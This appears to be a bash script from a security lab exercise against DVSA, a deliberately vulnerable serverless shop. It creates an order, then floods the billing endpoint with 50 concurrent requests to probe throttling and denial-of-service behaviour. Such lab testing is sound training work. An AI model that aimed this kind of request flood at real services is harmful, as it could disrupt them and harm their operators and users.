#!/bin/bash

echo "=== Creating test order ==="
ORDER_DOS=$(curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw '{"action":"new","cart-id":"dos-test-001","items":{"product-001":1}}' \
  | jq -r '.["order-id"] // empty')

if [ -z "$ORDER_DOS" ]; then
  echo "Failed to create order. Check TOKEN_B and DVSA state."
  exit 1
fi
echo "Created order: $ORDER_DOS"

echo
echo "=== Adding shipping ==="
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw "{\"action\":\"shipping\",\"order-id\":\"$ORDER_DOS\",\"data\":{\"address\":\"123 Test\",\"email\":\"t@t.c\",\"name\":\"Test\"}}" | jq

echo
echo "=== Firing 50 concurrent billing requests ==="
for i in $(seq 1 50); do
  curl -s "$API" \
    -H "content-type: application/json" \
    -H "authorization: $TOKEN_B" \
    --data-raw "{\"action\":\"billing\",\"order-id\":\"$ORDER_DOS\",\"data\":{\"ccn\":\"4242424242424242\",\"exp\":\"12/26\",\"cvv\":\"123\"}}" \
    > /tmp/dos_$i.txt &
done
wait

echo
echo "=== Counting throttle / error responses ==="
grep -l "TooManyRequests\|throttl\|429\|Internal" /tmp/dos_*.txt 2>/dev/null | wc -l
echo "responses out of 50 contained throttle/error keywords."

rm -f /tmp/dos_*.txt
